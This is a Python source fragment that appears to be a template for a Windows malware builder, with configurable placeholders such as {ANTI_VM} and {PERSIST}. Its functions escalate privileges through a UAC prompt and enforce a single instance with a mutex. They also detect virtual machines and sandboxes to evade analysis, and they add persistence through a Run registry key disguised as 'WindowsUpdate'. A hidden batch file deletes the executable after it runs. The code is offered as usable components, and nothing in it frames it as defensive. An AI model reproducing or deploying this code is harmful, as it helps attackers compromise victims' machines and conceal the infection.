def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_admin():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            time.sleep(3)
            sys.exit()
        except:
            pass
    return True

def check_mutex():
    if {MUTEX}:
        try:
            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
            if ctypes.windll.kernel32.GetLastError() == 183:
                sys.exit()
            return mutex
        except:
            pass
    return None

def check_vm():
    if {ANTI_VM}:
        try:
            vm_indicators = ["VMware", "VirtualBox", "VBox", "VMnet", "VirtIO", "QEMU", "Xen", "Hyper-V"]
            
            computer_name = os.environ.get("COMPUTERNAME", "").upper()
            for indicator in vm_indicators:
                if indicator.upper() in computer_name:
                    return True
            
            proc_info = os.environ.get("PROCESSOR_IDENTIFIER", "").upper()
            for indicator in vm_indicators:
                if indicator.upper() in proc_info:
                    return True
            
            try:
                output = subprocess.check_output("wmic computersystem get model", shell=True, stderr=subprocess.DEVNULL).decode().upper()
                for indicator in vm_indicators:
                    if indicator.upper() in output:
                        return True
            except:
                pass
            
            return False
        except:
            return False
    return False

def check_sandbox():
    try:
        uptime = psutil.boot_time()
        if time.time() - uptime < 300:
            return True
        
        if psutil.cpu_count() < 2:
            return True
        
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            return True
        
        return False
    except:
        return False

def startup_delay():
    if {STARTUP_DELAY}:
        time.sleep({DELAY_SECONDS})

def add_persistence():
    if {PERSIST}:
        try:
            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        except:
            pass

def self_destruct():
    try:
        bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
        exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
        
        escaped_path = exe_path.replace('\\', '\\\\')
        
        bat_lines = [
            '@echo off',
            'chcp 65001 >nul',
            'timeout /t 3 /nobreak >nul',
            f'del /f /q "{escaped_path}" >nul 2>&1',
            'del /f /q "%~f0" >nul 2>&1',
            'exit'
        ]
        
        bat_content = '\n'.join(bat_lines)
        
        with open(bat_path, 'w', encoding='utf-8') as f:
            f.write(bat_content)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.Popen(['cmd.exe', '/c', bat_path], 
                        startupinfo=startupinfo, 
                        creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
